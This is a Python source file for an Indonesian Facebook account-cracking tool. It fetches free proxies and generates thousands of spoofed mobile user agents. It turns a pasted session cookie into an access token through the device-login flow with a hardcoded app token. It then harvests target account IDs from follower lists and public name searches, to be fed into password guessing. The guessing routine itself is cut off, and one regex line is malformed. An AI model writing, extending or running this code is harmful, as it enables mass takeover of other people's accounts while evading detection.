import os, sys

try:
    import rich
except ImportError:
    print('\t• Modul Rich Proses •')
    os.system('pip install rich')
try:
    import stdiomask
except ImportError:
    print('\t• Modul Stdiomask Proses •')
    os.system('pip install stdiomask')
try:
    import requests
except ImportError:
    print('\t• Modul Requests Proses •')
    os.system('pip install requests && pip install mechanize')

import requests, bs4, json, random, datetime, time, re, urllib3, base64
import rich
from rich.table import Table as me
from rich.console import Console as sol
from bs4 import BeautifulSoup as sop
from bs4 import BeautifulSoup as parser
from concurrent.futures import ThreadPoolExecutor as tred
from rich.console import Group as gp
from rich.panel import Panel as panel
from rich.panel import Panel as nel
from rich.progress import track
from time import sleep
from rich import print
from concurrent.futures import ThreadPoolExecutor as BrayennnXD
from rich.panel import Panel
from rich.markdown import Markdown as mark
from rich.columns import Columns as col
from rich.tree import Tree
from rich import print as rprint
from rich import pretty
from rich.console import Console as sol
from rich.progress import Progress, SpinnerColumn, BarColumn, TextColumn
from rich.text import Text as tekz

dump = []
memek = []
ualu, ualuh = [], []

###----------[ IMPORT MODULE RICH ]---------- ###
from rich.panel import Panel
from rich.tree import Tree
from rich.console import Console
from rich.table import Table
from rich.columns import Columns
from rich.progress import Progress, SpinnerColumn, BarColumn, TextColumn, TimeElapsedColumn

console = Console()
sys.stdout.write('\x1b]2; AKUDAMA.XD | EVANESCENCE \x07')

#------------------[ USER-AGENT ]-------------------#
pretty.install()
CON = sol()
ugen2 = []
ugen = []
cokbrut = []
dia = []
lisensikuni, lisensiku = [], []
ses = requests.Session()
princp = []
wa = Console()

try:
    prox = requests.get('https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks4&timeout=80000&country=all&ssl=all&anonymity=all', timeout=10).text
    open('.prox.txt', 'w').write(prox)
except:
    print('\n[!] Cek Koneksi Intermu')

prox = open('.prox.txt').read().splitlines() if os.path.exists('.prox.txt') else []

for xd in range(10000):
    a = random.choice(['3','4','5','6','7','8','9','10','11','12','13'])
    b = random.choice(['3','4','5','6','7','8','9','10','11','12','13'])
    c = random.randrange(73,100)
    d = random.randrange(4200,4900)
    e = random.randrange(40,150)
    uaku = f'Mozilla/5.0 (Linux; Android {a}; SAMSUNG SM-A305FN) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{c}.0.{d}.{e} Mobile Safari/537.36'
    ugen2.append(uaku)

for meki in range(5000):
    negara = random.choice(["id_ID","en_US","en_GB","it_IT"])
    rc = random.choice
    rr = random.randint
    raka1 = f"Mozilla/5.0 (Linux; U; Android 11; zh-CN; Redmi Note 8 Pro Build/RP1A.200720.011) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/78.0.3904.108 UCBrowser/{str(rr(10,90))}.{str(rr(1,9))}.{str(rr(1,9))}.{str(rr(1000,1900))} Mobile Safari/537.36"
    raka2 = f"Mozilla/5.0 (Linux; Android {str(rr(5,12))}; SM-A125F Build/RP1A.200720.012; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{str(rr(40,113))}.0.{str(rr(4100,4900))}.{str(rr(40,113))} Mobile Safari/537.36 Instagram {str(rr(210,380))}.1.0.{str(rr(10,300))}.{str(rr(100,120))} Android (30/11; 300dpi; {str(rr(100,999))}x{str(rr(100,2000))}; samsung; SM-A125F; a12; mt6765; {negara}; 333717262)"
    nokiacoeg = f"Mozilla/5.0 (Linux; U; Android 2.3.5; en-us; Karbonn A18+ Bulid/MocorDroid2.3.5) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Chrome/81.0.4044.117 Mobile Safari/533.1 [FB_IAB/MESSENGER;FBAV/111.0.0.15.46;]"
    coegg = f"Mozilla/5.0 (Linux; Android 4.1.2; Nokia_X Build/JZO54K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/30.0.1599.82 Mobile Safari/537.36 NokiaBrowser/1.0.1.54"
    cogg = f"Dalvik/2.1.0 (Android 9; L-03K Build/PKQ1.190522.001) [FBAN/MessengerLite;FBAV/141.0.0.2.117;FBPN/com.facebook.mlite;FBLC/en_US;FBBV/293513921;FBCR/Airtel;FBMF/Facebook;Facebook/lge;FBDV/L-03K;FBSV/9;FBCA"
    cogg1 = f"Dalvik/2.1.0 (Android 9; L-03K Build/PKQ1.190522.001) [FBAN/MessengerLite;FBAV/141.0.0.2.117;FBPN/com.facebook.mlite;FBLC/en_US;FBBV/293513921;FBCR/Airtel;FBMF/LGE;FBBD/lge;Facebook/L-03K;FBSV/9;FBCA"
    cogg2 = f"Dalvik/2.1.0 (Android 9; L-03K Build/PKQ1.190522.001) [FBAN/MessengerLite;FBAV/141.0.0.2.117;FBPN/com.facebook.mlite;FBLC/en_US;FBBV/293513921;FBCR/Airtel;FBMF/LGE;FBBD/lge;FBDV/L-03K;FBSV/9;FBCA"
    cogg3 = f"Mozilla/5.0 (Android 9; HUAWEI BLA-L29) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/30.0.0.0 Mobile Safari/537.36 SurfBrowser/3.0"
    cogg4 = f"Dalvik/2.1.0 (Linux; U; Android 8.0.0; SM-A720F Build/R16NW) [FBAN/Orca-Android;FBAV/196.0.0.29.99;FBPN/com.facebook.orca;FBLC/th_TH;FBBV/135374479;FBCR/AIS;FBMF/samsung;FBBD/samsung;FBDV/SM-A720F;FBSV/8.0.0;FBCA/armeabi-v7a:armeabi;FBDM/(density=3.0,width=1080,height=1920);FB_FW/1;]"
    cooooeeeggg = random.choice([raka1, raka2, nokiacoeg, coegg, cogg, cogg1, cogg2, cogg3, cogg4])
    ugen.append(cooooeeeggg)

for t in range(10000):
    k1 = 'Mozilla/5.0 (Linux; Android 7.1.1; SM-J250F Build/NMF26X; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/86.0.4240.185 Mobile Safari/537.36 [FB_IAB/Orca-Android;FBAV/288.0.0.15.118;]'
    matahari14 = k1
    k2 = 'Mozilla/5.0 (Linux; Android 7.1.1; SM-J250F Build/NMF26X; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/64.0.3282.137 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/394.1.0.51.107;]'
    matahari13 = k2
    k3 = 'Mozilla/5.0 (Linux; U; Android 12; ru-ru; Redmi Note 10 Build/SKQ1.210908.001) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/89.0.4389.116 Mobile Safari/537.36 XiaoMi/MiuiBrowser/12.22.0.3-gn'
    matahari10 = k3
    k4 = 'Mozilla/5.0 (iPhone; CPU iPhone OS 12_5_7 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/16H81 [FBAN/FBIOS;FBDV/iPhone6,1;FBMD/iPhone;FBSN/iOS;FBSV/12.5.7;FBSS/2;FBID/phone;FBLC/es_LA;FBOP/5]'
    matahari11 = k4
    k5 = 'Mozilla/5.0 (Linux; Android 13; SM-G770F Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.58 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/407.0.0.30.97;]'
    matahari12 = k5
    k6 = 'Mozilla/5.0 (Linux; Android 10; SM-G770F Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/81.0.4044.138 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/215.0.0.9.119;]'
    matahari15 = k6
    k7 = 'Mozilla/5.0 (Linux; Android 13; SAMSUNG SM-G770F) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/20.0 Chrome/106.0.5249.126 Mobile Safari/537.36'
    m1 = k7
    k8 = 'Mozilla/5.0 (Linux; Android 13; SM-G770F Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/110.0.5481.122 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/403.0.0.27.81;]'
    m2 = k8

    strvrun = random.randint
    uz1 = f"Mozilla/5.0 (Linux; Android {str(strvrun(1,5))}.1.1; SM-J111F Build/LMY47V; rv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Rocket/1.0.0.1 Chrome/{str(strvrun(10,55))}.0.2883.91 Mobile Safari/537.36"
    uz6 = f"Mozilla/5.0 (Linux; Android {str(strvrun(1,4))}.{str(strvrun(1,4))}.{str(strvrun(1,4))}; SM-J110H Build/KTU84P; pt-pt) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{str(strvrun(10,42))}.0.2311.135 Mobile Safari/537.36 Puffin/6.0.7.15747AP"
    uz3 = f"Mozilla/5.0 (Linux; Android {str(strvrun(8,11))}; M2102J20SG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{str(strvrun(50,111))}.0.0.0 Mobile Safari/537.36 EdgA/{str(strvrun(50,111))}.0.1661.{str(strvrun(10,59))} User Agent By Teddy Ganteng Sekali."
    uz2 = f'Mozilla/5.0 (Linux; U; Android 8.1.0; TECNO IN6 Build/O11019; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/75.0.3770.67 Mobile Safari/537.36 OPR/52.2.2254.54723'
    ua4 = f'Mozilla/5.0 (Linux; Android 8.1.0; Redmi 5 Plus Build/OPM1.171019.019) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.61 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]'
    uz4 = f'Mozilla/5.0 (Linux; Android 8.1.0; Redmi 5 Plus Build/OPM1.171019.019) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.61 Mobile Safari/537.36'
    uz5 = f'Mozilla/5.0 (Linux; Android 9; vivo 1902) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.198 Mobile Safari/537.36 OPR/61.2.3076.56749'

    aa = 'Mozilla/5.0 (Symbian/3; Series60/'
    b = random.randrange(1, 9)
    c = random.randrange(1, 9)
    d = 'Nokia'
    e = random.randrange(100, 9999)
    f = '/110.021.0028; Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/535.1 (KHTML, like Gecko) NokiaBrowser/'
    g = random.randrange(1, 9)
    h = random.randrange(1, 4)
    i = random.randrange(1, 4)
    j = random.randrange(1, 4)
    k = 'Mobile Safari/535.1'
    wikwik = f'{aa}{b}.{c} {d}{e}{f}{g}.{h}.{i}.{j} {k}'

    aa2 = 'Mozilla/5.0 (Linux; U; Android'
    b2 = random.choice(['6','7','8','9','10','11','12'])
    c2 = ' en-us; GT-'
    d2 = random.choice(['A','B','C','D','E','F','G','H','I','J','K','L','M','N','O','P','Q','R','S','T','U','V','W','X','Y','Z'])
    e2 = random.randrange(1, 999)
    f2 = random.choice(['A','B','C','D','E','F','G','H','I','J','K','L','M','N','O','P','Q','R','S','T','U','V','W','X','Y','Z'])
    g2 = 'AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
    h2 = random.randrange(73,100)
    i2 = '0'
    j2 = random.randrange(4200,4900)
    k2 = random.randrange(40,150)
    l2 = 'Mobile Safari/537.36'
    ter = f'{aa2} {b2}; {c2}{d2}{e2}{f2}) {g2}{h2}.{i2}.{j2}.{k2} {l2}'

    a3 = random.choice(['3','4','5','6','7','8','9','10','11','12'])
    b3 = random.choice(['OPM1','TP1A','RP1A','PPR1','PKQ1','QP1A','SP1A','RKQ1'])
    c3 = random.randrange(111111,210000)
    d3 = random.randrange(11,19)
    e3 = random.randrange(73,100)
    f3 = random.randrange(4200,4900)
    g3 = random.randrange(40,150)
    random1 = random.choice(['SM-M236B','SM-A037G','SM-J701MT','SM-A115U','SM-G610M','SM-J530F','SM-A307FN','SM-A405FN'])
    random2 = random.choice(['SM-J415N','SM-R765T','SM-A730F','SM-A605G','SM-J610F','SM-N9750','SM-G935A'])
    bintang = f'Mozilla/5.0 (Linux; Android {a3}; {random1} Build/{b3}.{c3}.0{d3}; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{e3}.0.{f3}.{g3} Mobile Safari/537.36'
    bulan = f'Mozilla/5.0 (Linux; Android {a3}; {random2} Build/{b3}.{c3}.0{d3}; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{e3}.0.{f3}.{g3} Mobile Safari/537.36'

    uasu = random.choice([m1, uz1, uz6, uz5, m2, bintang, matahari10, matahari11, matahari12, matahari13, ua4, matahari14, matahari15, ter, wikwik])
    ugen.append(uasu)

for x in range(10):
    a = 'Mozilla/5.0 (Linux; Android 9: zh-cn: Redmi 8A) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
    b = random.randrange(100, 9999)
    c = random.randrange(100, 9999)
    d = random.choice(['A','B','C','D','E','F','G','H','I','J','K','L','M','N','O','P','Q','R','S','T','U','V','W','X','Y','Z'])
    e = random.choice(['A','B','C','D','E','F','G','H','I','J','K','L','M','N','O','P','Q','R','S','T','U','V','W','X','Y','Z'])
    f = random.choice(['A','B','C','D','E','F','G','H','I','J','K','L','M','N','O','P','Q','R','S','T','U','V','W','X','Y','Z'])
    g = random.choice(['A','B','C','D','E','F','G','H','I','J','K','L','M','N','O','P','Q','R','S','T','U','V','W','X','Y','Z'])
    h = random.randrange(1, 9)
    i = 'Linux; Android 9: zh-cn: Redmi 8A)'
    j = random.randrange(1, 9)
    k = random.randrange(1, 9)
    l = 'Mobile Safari/E7FBAF'
    uak = f'{a}{b}/{c}{d}{e}{f}{g}{h}{i}{j}.{k} {l}'
    ugen2.append(uak)

def uaku():
    try:
        ua = open('bbnew.txt').read().splitlines()
        for ub in ua:
            ugen.append(ub)
    except:
        a = requests.get('https://github.com/EC-1709/a/blob/main/bbnew.txt').text
        ua = open('.bbnew.txt', 'w')
        aa = re.findall(r'line">(.*?)<', str(a))
        for un in aa:
            ua.write(un + '\n')
        ua = open('.bbnew.txt').read().splitlines()

###----------[ WARNA PRINT RICH ]---------- ###
M2 = "[#FF0000]"
H2 = "[#00FF00]"
K2 = "[#FFFF00]"
B2 = "[#00C8FF]"
P2 = "[#FFFFFF]"

###----------[ CEK WARNA TEMA ]---------- ###
try:
    file_color = open("data/theme_color").read()
    color_text = file_color.split("|")[0]
    color_panel = file_color.split("|")[1]
except:
    color_text = "[#00C8FF]"
    junWik = "#00C8FF"
    stenly = "#FFFF00"
    mat = "#FFFFFF"
    fikri = "#00FF00"
    sabi = "#FF0000"
    color_panel = random.choice([junWik, sabi, stenly, mat, fikri])

#------------[ INDICATION ]---------------#
id, id2, loop, ok, cp, akun, oprek, lisensiku, tokenku, uid, lisensikuni = [], [], 0, 0, 0, [], [], [], [], [], []
taplikasi = ['no']
cokbrut = []
method = []
pwpluss, pwnya = [], []

#------------[ WARNA-COLOR ]--------------#
P = '\x1b[0;37m'
M = '\x1b[0;31m'
H = '\x1b[0;32m'
K = '\x1b[0;33m'
B = '\x1b[1;94m'
U = '\x1b[1;95m'
O = '\x1b[1;96m'
N = '\x1b[0m'
Z = "\033[0;30m"
sir = '\033[41m\x1b[1;97m'
x = '\33[m'
m = '\x1b[0;31m'
k = '\033[0;33m'
h = '\x1b[0;32m'
hh = '\033[32m'
u = '\033[35m'
kk = '\033[0;33m'
b = '\33[0;36m'
p = '\x1b[0;34m'
asu = random.choice([m, k, h, u, b])
zam = '\033[0;32m[\033[0;37m➣\033[0;32m]\033[0;37m'
zma = '\033[0;32m[\033[0;37m➣\033[0;32m]\033[0;37m'
zam1 = '\033[0;32m[\033[0;37m1\033[0;32m]\033[0;37m'
zam2 = '\033[0;32m[\033[0;37m2\033[0;32m]\033[0;37m'
zam3 = '\033[0;32m[\033[0;37m3\033[0;32m]\033[0;37m'
zam4 = '\033[0;32m[\033[0;37m4\033[0;32m]\033[0;37m'
zam5 = '\033[0;32m[\033[0;37m5\033[0;32m]\033[0;37m'
zam6 = '\033[0;32m[\033[0;37m6\033[0;32m]\033[0;37m'
zam0 = '\033[0;32m[\033[0;37m0\033[0;32m]\033[0;37m'
plh = '\n\033[0;32m[\033[0;37m➣\033[0;32m]\033[0;37m Pilih '
plhh = '\n\033[0;32m[\033[0;37m➣\033[0;32m]\033[0;37m Pilih :\033[0;32m '
plhhh = '\n\033[0;32m[\033[0;37m➣\033[0;32m]\033[0;37m Cookie :\033[0;32m '
zam1v = '\033[0;32m[\033[0;37m1v/r\033[0;32m]\033[0;37m'
zam2v = '\033[0;32m[\033[0;37m2v/r\033[0;32m]\033[0;37m'
zam3v = '\033[0;32m[\033[0;37m3v/r\033[0;32m]\033[0;37m'

#--------------------[ CONVERTER-BULAN ]--------------#
dic = {'1': 'Januari', '2': 'Februari', '3': 'Maret', '4': 'April', '5': 'Mei', '6': 'Juni', '7': 'Juli',
       '8': 'Agustus', '9': 'September', '10': 'Oktober', '11': 'November', '12': 'Desember'}
dic2 = {'01': 'January', '02': 'February', '03': 'March', '04': 'April', '05': 'May', '06': 'June', '07': 'July',
        '08': 'August', '09': 'September', '10': 'October', '11': 'November', '12': 'December'}
tgl = datetime.datetime.now().day
bln = dic[(str(datetime.datetime.now().month))]
thn = datetime.datetime.now().year
okc = 'OK-' + str(tgl) + '-' + str(bln) + '-' + str(thn) + '.txt'
cpc = 'CP-' + str(tgl) + '-' + str(bln) + '-' + str(thn) + '.txt'

#------------------[ MACHINE-SUPPORT ]---------------#
def gpull():
    os.system('git pull')

def alvino_xy(u):
    for e in u + "\n":
        sys.stdout.write(e)
        sys.stdout.flush()
        time.sleep(0.005)

def clear():
    os.system('clear')

def back():
    login()

def haecerjoin_tm(u):
    for e in u + "\n":
        sys.stdout.write(e)
        sys.stdout.flush()
        time.sleep(0.03)

def haecerjoin_v(z):
    for e in z + "\n":
        sys.stdout.write(e)
        sys.stdout.flush()
        time.sleep(0.05)

def haecerjoin_c(z):
    for e in z + "\n":
        sys.stdout.write(e)
        sys.stdout.flush()
        time.sleep(0.0001)

#------------------[ LOGO-LAKNAT ]-----------------#
def banner():
    os.system('clear')
    print(r"""
\033[0;37m┌════════════════════════════════════════┐
\033[0;32m█	  __________       .__   \033[0;32m	 █
\033[0;32m█	  \____    / _____ |  |  \033[0;32m	 █
\033[0;32m█	    /     / /     \|  |  \033[0;32m	 █
\033[0;37m█	   /     /_|  Y Y  \  |__\033[0;37m	 █
\033[0;37m█	  /_______ \__|_|  /____/\033[0;37m	 █
\033[0;37m█	          \/     \/      \033[0;37m	 █
\033[0;37m└════════════════════════════════════════┘      \n""")

def logo():
    os.system('clear')
    print(r"""
\033[0;37m┌════════════════════════════════════════┐
\033[0;32m█	  __________       .__   \033[0;32m	 █
\033[0;32m█	  \____    / _____ |  |  \033[0;32m	 █
\033[0;32m█	    /     / /     \|  |  \033[0;32m	 █
\033[0;37m█	   /     /_|  Y Y  \  |__\033[0;37m	 █
\033[0;37m█	  /_______ \__|_|  /____/\033[0;37m	 █
\033[0;37m█	          \/     \/      \033[0;37m	 █
\033[0;37m└════════════════════════════════════════┘        

             \033[0;32m[ \033[0;37mMeki Berkuah \033[0;32m]
       \033[0;32m  [\033[0;37m Created By Zamxyz XD \033[0;32m]\033[0;37m\n""")

#--------------------[ BAGIAN-MASUK ]--------------#
def login123():
    os.system('clear')
    banner()
    mulai()
    print(f"{zam1} Login Cookie\n{zam2} Crack No Login\n{zam3} Cek Results\n{zam0} Keluar")
    zmeemk = input(f"{plhh}")
    if zmeemk in ['1','01']:
        login_lagi334()
    elif zmeemk in ['2','02']:
        lainnya()
    elif zmeemk in ['3','03']:
        result()
    elif zmeemk in ['0']:
        exit()
    else:
        print('\n\033[0;32m[\033[0;37m➣\033[0;32m]\033[0;37m Pilih Yang Bener Tolol ')
        time.sleep(5)
        back()

def login():
    try:
        token = open('akmd.txt').read()
        cok = open('akmdx.txt').read()
        tokenku.append(token)
        try:
            sy = requests.get('https://graph.facebook.com/me?fields=id,name&access_token=' + tokenku[0], cookies={'cookie': cok}, timeout=10)
            sy2 = sy.json()['name']
            sy3 = sy.json()['id']
            menu(sy2, sy3)
        except KeyError:
            login123()
        except requests.exceptions.ConnectionError:
            li = ' \tTidak Bisa Masuk Tod, Cek Koneksi Ente'
            lo = mark(li, style='red')
            sol().print(lo, style='cyan')
            exit()
    except OSError:
        login123()

def login_lagi334():
    try:
        os.system('clear')
        logo()
        print(f'{zam} Gunakan Cookies Yang Masih Fresh Untuk Login Masbro')
        your_cookies = input(f'{plhhh}')
        with requests.Session() as r:
            try:
                r.headers.update({'content-type': 'application/x-www-form-urlencoded'})
                data = {'access_token': '1348564698517390|007c0a9101b9e1c8ffab727666805038', 'scope': ''}
                response = json.loads(r.post('https://graph.facebook.com/v2.6/device/login/', data=data).text)
                code, user_code = response['code'], response['user_code']
                verification_url = f'https://m.facebook.com/device?user_code={user_code}'
                status_url = f'https://graph.facebook.com/v2.6/device/login_status?method=post&code={code}&access_token=1348564698517390%7C007c0a9101b9e1c8ffab727666805038&callback=LeetsharesCallback'
                r.headers.pop('content-type')
                r.headers.update({'sec-fetch-mode': 'navigate', 'user-agent': 'Mozilla/5.0 (Linux; Android 9; RMX1941 Build/PPR1.180610.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/107.0.5304.54 Mobile Safari/537.36', 'sec-fetch-site': 'cross-site', 'Host': 'm.facebook.com', 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9', 'sec-fetch-dest': 'document'})
                response2 = r.get(verification_url, cookies={'cookie': your_cookies}).text
                if 'Bagaimana Anda ingin masuk ke Facebook?' in response2 or '/login/?next=' in response2:
                    print(f"\n{zam} Cookie Invalid...", end='\r')
                    time.sleep(3.5)
                    print("                     ", end='\r')
                    login_lagi334()
                else:
                    action = re.search(r'action="(.*?)">', response2).group(1).replace('amp;', '')
                    fb_dtsg = re.search(r'name="fb_dtsg" value="(.*?)"', response2).group(1)
                    jazoest = re.search(r'r'name="jazoest" value="(\d+)"', response2).group(1)
                    data = {'fb_dtsg': fb_dtsg, 'jazoest': jazoest, 'qr': 0, 'user_code': user_code}
                    r.headers.update({'origin': 'https://m.facebook.com', 'referer': verification_url, 'content-type': 'application/x-www-form-urlencoded', 'sec-fetch-site': 'same-origin'})
                    response3 = r.post(f'https://m.facebook.com{action}', data=data, cookies={'cookie': your_cookies})
                    if 'https://m.facebook.com/dialog/oauth/?auth_type=rerequest&redirect_uri=' in str(response3.url):
                        r.headers.pop('content-type')
                        r.headers.pop('origin')
                        response4 = r.post(response3.url, data=data, cookies={'cookie': your_cookies}).text
                        action = re.search(r'action="(.*?)"', response4).group(1).replace('amp;', '')
                        fb_dtsg = re.search(r'name="fb_dtsg" value="(.*?)"', response4).group(1)
                        jazoest = re.search(r'name="jazoest" value="(\d+)"', response4).group(1)
                        scope = re.search(r'name="scope" value="(.*?)"', response4).group(1)
                        display = re.search(r'name="display" value="(.*?)"', response4).group(1)
                        user_code = re.search(r'name="user_code" value="(.*?)"', response4).group(1)
                        logger_id = re.search(r'name="logger_id" value="(.*?)"', response4).group(1)
                        auth_type = re.search(r'name="auth_type" value="(.*?)"', response4).group(1)
                        encrypted_post_body = re.search(r'name="encrypted_post_body" value="(.*?)"', response4).group(1)
                        return_format = re.search(r'name="return_format\[\]" value="(.*?)"', response4).group(1)
                        r.headers.update({'origin': 'https://m.facebook.com', 'referer': response3.url, 'content-type': 'application/x-www-form-urlencoded'})
                        data = {'fb_dtsg': fb_dtsg, 'jazoest': jazoest, 'scope': scope, 'display': display, 'user_code': user_code, 'logger_id': logger_id, 'auth_type': auth_type, 'encrypted_post_body': encrypted_post_body, 'return_format[]': return_format}
                        response5 = r.post(f'https://m.facebook.com{action}', data=data, cookies={'cookie': your_cookies}).text
                        windows_referer = re.search(r'window.location.href="(.*?)"', response5).group(1).replace('\\', '')
                        r.headers.pop('content-type')
                        r.headers.pop('origin')
                        r.headers.update({'referer': 'https://m.facebook.com/'})
                        response6 = r.get(windows_referer, cookies={'cookie': your_cookies}).text
                        if 'Sukses!' in response6:
                            r.headers.update({'sec-fetch-mode': 'no-cors', 'referer': 'https://graph.facebook.com/', 'Host': 'graph.facebook.com', 'accept': '*/*', 'sec-fetch-dest': 'script', 'sec-fetch-site': 'cross-site'})
                            response7 = r.get(status_url, cookies={'cookie': your_cookies}).text
                            access_token = re.search(r'"access_token": "(.*?)"', response7).group(1)
                            print(f"\n{zam} Token :{H} {access_token}")
                            open("akmd.txt", "w").write(access_token)
                            open("akmdx.txt", "w").write(your_cookies)
                            print(f"\n{zam} Good, Login Berhasil Masbro\n")
                            os.system('python 2.1.py')
            except Exception as e:
                print(f"\n{zam} Yahahah Tumbal Mokad")
                os.system('rm -rf akmd.txt && rm -rf akmdx.txt')
                print(e)
                time.sleep(1)
                login_lagi334()
    except:
        pass

def mulai():
    os.system('clear')
    banner()
    key = 'NN7U-XCTR-****-****-****'
    gh = 'github.com/zamxyz'
    print(f"{zam} Author   :{h} ZAMXYZ XD \n{zam} Github   :{h} {gh}\n{zam} Facebook : {h}100000464945488\n{zam} Telegram : {h}PANTAD_BABI_BERSINAR\n")

#------------------[ BAGIAN-MENU ]----------------#
def menu(my_name, my_id):
    try:
        token = open('akmd.txt').read()
        cok = open('akmdx.txt').read()
    except OSError:
        print(f'{zam} Cookies Kadaluarsa ')
        time.sleep(5)
        login()
    os.system('clear')
    banner()
    print(f'{zam} Username : {h}{my_name}\n{zam} User Idz : {h}{my_id}\n')
    print(f"{zam1} Crack Publik \n{zam2} Crack Pengikut \n{zam3} Cek Results\n{zam0} Keluar")
    kamu_nanya = input(f'{plhh}')
    if kamu_nanya in ['1','01']:
        dump_massal()
    elif kamu_nanya in ['2','02']:
        pengikut()
    elif kamu_nanya in ['3','03']:
        result()
    elif kamu_nanya in ['4','03']:
        crack_email()
    elif kamu_nanya in ['0','0','out']:
        os.system('rm -rf akmd.txt')
        os.system('rm -rf akmdx.txt')
        print(f'{zam} {m}Sukses Logout{x}')
        time.sleep(5)
        login_lagi334()
    else:
        print('\n\033[0;32m[\033[0;37m➣\033[0;32m]\033[0;37m Pilih Yang Bener Asu ')
        exit()

def error():
    print(' [+] Maaf Fitur Ini Masih Di Perbaiki')
    time.sleep(4)
    back()

def siu():
    start()
    get_data_web()
    akhir()

###----------[ DUMP PENGIKUT ]---------- ###
def pengikut():
    try:
        token = open('akmd.txt').read()
        cok = open('akmdx.txt').read()
    except OSError:
        exit()
    ses = requests.Session()
    print(f'\n\033[0;32m[\033[0;37m➣\033[0;32m]\033[0;37m Ketik ({H}me{P} ) Jika Ingin Crack Follower Sendiri ')
    pi = input('\033[0;32m[\033[0;37m➣\033[0;32m]\033[0;37m Masukkan Idz Target : ')
    try:
        koh2 = ses.get(f'https://graph.facebook.com/{pi}?fields=subscribers.limit(5000)&access_token={token}', cookies={'cookie': cok}).json()
        for pi in koh2.get('subscribers', {}).get('data', []):
            try:
                id.append(pi['id'] + '|' + pi['name'])
                sys.stdout.write(f"\r{zam} Mengumpulkan {len(id)} Idz...")
                sys.stdout.flush()
                time.sleep(0.0002)
            except:
                continue
        print("\r")
        print(f'\033[0;32m[\033[0;37m➣\033[0;32m]\033[0;37m Total Idz :{h} ' + str(len(id)))
        setting()
    except requests.exceptions.ConnectionError:
        print('\033[0;32m[\033[0;37m➣\033[0;32m]\033[0;37m Koneksi Bermasalah Masbro ')
        time.sleep(3)
        exit()
    except (KeyError, OSError):
        print('\033[0;32m[\033[0;37m➣\033[0;32m]\033[0;37m Gagal Dump Tod ')
        time.sleep(3)
        exit()

#----------------------[ MENU CRACK LAINNYA ]----------------------#
def lainnya():
    logo()
    print(f"""{zam1} Cloning Name \n{zam2} Cloning Email \n{zam0} Kembali""")
    bray = input(f'{plhh}')
    if bray in(''):
        print(f'\n\033[0;32m[\033[0;37m➣\033[0;32m]\033[0;37m Pilih Yang Bener Asu ')
        back()
    elif bray in('1','01'):
        crack_nama()
    elif bray in('2','02'):
        crack_email()
    elif bray in('0','00'):
        back()
    else:
        print('\n\033[0;32m[\033[0;37m➣\033[0;32m]\033[0;37m Pilih Yang Bener Asu ')
        exit()

#----------------------[ CRACK USERNAME ]----------------------#
def crack_nama():
    nama = []
    custom = [" rehan", " suka", " siska", " alwy", " medan", " new", " old", " jian", " store", " tias", " rio", " lia", " farz", " marvel", " jakarta", " anisha", " juven", " der", " rika", " udin", " rayan", " tina", " tiara", " fahmi", " baili", " rima", " gadis", " dimas", " abram", " ajis", " vicky", " charlie", " piko", " billa"]
    custom2 = ["galang ", "gilang ", "gita ", "steven ", "aulia ", "tiyas ", "amat ", "naura ", "anton ", "reval ", "abi ", "yehezkiel ", "hafiz ", "daniel ", "angun "]
    print(f'\n{zam} Crack Username Satu Nama Yang Ingin Di Crack\n')
    nam = input(f'{zam} Nama : {H}').split(",")
    for ser in nam:
        ser = ser.strip()
        for belakang in custom:
            ids = ser + belakang
            nama.append(ids)
        for depan in custom2:
            ids = depan + ser
            nama.append(ids)
    with tred(max_workers=10) as thread:
        for ids in nama:
            thread.submit(cari_nama, f"https://mbasic.facebook.com/public/{ids}?/locale2=id_ID")
    setting()

def cari_nama(link):
    try:
        ua = random.choice(ugen)
        headers = {'User-Agent': ua}
        r = requests.get(link, headers=headers, timeout=15)
        soup = parser(r.text, 'html.parser')
        for x in soup.find_all('td'):
            data = re.findall(r'<a href="/(.*?)"><div class=".*?"><div class=".*?">(.*?)</div>', str(x))
            for uid, n in data:
                if 'profile.php?' in uid:
                    uid = re.findall(r'id=(.*)', uid)[0]
                elif '<span' in n:
                    n = re.findall(r'(.*?)<', n)[0]
                bo = uid + '|' + n
                if bo not in id:
                    id.append(bo)
                    sys.stdout.write(f"\r{zam} Mengumpulkan {len(id)} Idz ...")
                    sys.stdout.flush()
